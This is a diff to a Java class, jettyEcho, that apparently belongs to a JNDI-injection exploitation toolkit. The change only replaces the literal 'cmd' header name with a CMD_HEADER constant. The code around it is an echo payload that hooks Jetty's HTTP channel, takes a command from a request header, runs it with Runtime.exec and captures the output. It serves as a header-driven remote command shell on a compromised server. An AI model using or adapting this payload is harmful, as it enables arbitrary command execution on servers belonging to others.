@@ -2,6 +2,8 @@ package com.qi4l.jndi.template.echo;
 
 public class jettyEcho {
 
+    public static String CMD_HEADER = "cmd";
+
     static {
         try {
             Class clazz = Thread.currentThread().getClass();
@@ -47,7 +49,7 @@ public class jettyEcho {
                     obj = method.invoke(httpChannel, null);
 
                     method = obj.getClass().getMethod("getHeader", new Class[]{String.class});
-                    String cmd = (String)method.invoke(obj, new Object[]{"cmd"});
+                    String cmd = (String)method.invoke(obj, new Object[]{CMD_HEADER});
                     if(cmd != null && !cmd.isEmpty()){
                         String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
